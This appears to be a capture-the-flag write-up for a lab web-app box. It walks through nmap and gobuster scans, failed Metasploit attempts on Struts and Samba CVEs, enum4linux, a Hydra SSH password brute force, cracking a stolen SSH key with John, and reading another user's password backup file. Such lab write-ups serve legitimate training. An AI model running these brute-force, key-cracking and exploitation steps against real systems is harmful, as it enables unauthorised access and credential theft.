# Box: Web App Test

- My IP: `10.8.82.167`
- Box IP: `10.10.96.196`


#### 1. Find the services exposed by the machine:
Hint - use an nmap scan to look for the open ports.

**Command**:
`nmap -Pn -A -v 10.10.96.196`

##### Reason:
- `Pn`: Treat all hosts as online -- skip host discovery
- `A`: Enable OS detection, version detection, script scanning, and traceroute
- `v`: Increase verbosity level (use -vv or more for greater effect)

##### Analysis of nmap output:
[---nmap output---](nmap_output.txt)

We can see that port 22 (SSH), port 80 (HTTP), ports 139/445 (SMB), port 8009 (ajp3) and port 8080 (HTTP) are open.

#### What is the name of the hidden directory on the web server(enter name without /)?
Hint - use dirsearch/dirbuster to find the hidden directories.

We are going to use gobuster instead to find out this information.

`gobuster dir -u 10.10.41.37 -w /usr/share/dirb/wordlists/common.txt`

- `-u, --url`: The target URL
- `dir`: Uses directory/file brute forcing mode
- `-w, --wordlist`: Path to the wordlist

Analysis of gobuster output:
[---gobuster output---](gobuster_output.txt)

We can see a Status 301 (Moved Permanently) to a hidden directory called /development.

Contents:

`Index of /development
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	dev.txt	2018-04-23 14:52 	483 	 
[TXT]	j.txt	2018-04-23 13:10 	235 	 
Apache/2.4.18 (Ubuntu) Server at 10.10.96.196 Port 80`

2 files, dev.txt and j.txt.

`dev.txt` talks about something related to Apache struts, version 2.5.12.

`j.txt` mentions /etc/shadow and a weak password hash.

Attempt 1 - Exploit Struts:

Now we look up Struts v2.5.12 to see if there are any CVEs.

Found CVE-2017-9805, for which there is a metasploit exploit.

```
$ sudo msfdb init && msfconsole
$ search cve-2017-9805
$ use struts2_rest_xstream
$ set RHOSTS 10.10.96.196
$ run
```
Output:

[\*] Started reverse TCP handler on 10.0.2.15:4444
[\*] Exploit completed, but no session was created.

Outcome - Didn't work 0 No reverse shell created.

Attempt 2 - SMB Exploit :

Looking back at nmap output, we can see SMB (Samba 4.3.11-Ubuntu).

is_known_pipename() Arbitrary Module Load (Metasploit) found - CVE-2017-7494

Running exploit:
in metasploit--

```
$ search cve-2017-7494
$ use is_known_pip (don't have tot type in entire name)
```
Output:
```
[-] 10.10.96.196:445 - Exploit failed: An exploitation error occurred.
[*] Exploit completed, but no session was created.
```
Outcome - Didn't work.

Attempt 3 - Enumerate using enum4linux:

enum4linux allows us to enumerate information from Windows + Samba systems. So lets try that:

`enum4linux -a 10.10.96.196`

Output in file.

Analysis:
2 users -- kay, jan

#### What is the username?
jan

#### What is the password?
Brute force SSH using Hydra:

`hydra -t 4 -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.96.196`

- `-t 4`: TASKS  run TASKS number of connects in parallel per target (default: 16)
- `-l`: LOGIN name
- `-P`: load several passwords from FILE

From output, we can see the password is `armando`.

#### What service do you use to access the server(answer in abbreviation in all caps)?

Answer: ssh

`ssh jan@10.10.96.196`

#### Enumerate the machine to find any vectors for privilege escalation

Navigating to kay's home folder, we see a file called pass.bak, owned by kay.

`-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak`

We can also navigate to kay's .ssh folder and view kay's SSH key!

`python /usr/share/john/ssh2john.py kay_id_rsa > kay_id_rsa.hash`

The .hash file is now one that JohnTheRipper can work on.

`/usr/sbin/john --wordlist=/root/Desktop/dict/rockyou.txt id_rsa.hash`

Found a password: `beeswax`

Now we can use kay's id_rsa file to gain access to kay's shell:

`chmod 600 kay_id_rsa`
`ssh -i kay_id_rsa kay@10.10.96.196`

Navigate to Kay's home page:

`cat pass.bak`

Output: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

Completed!
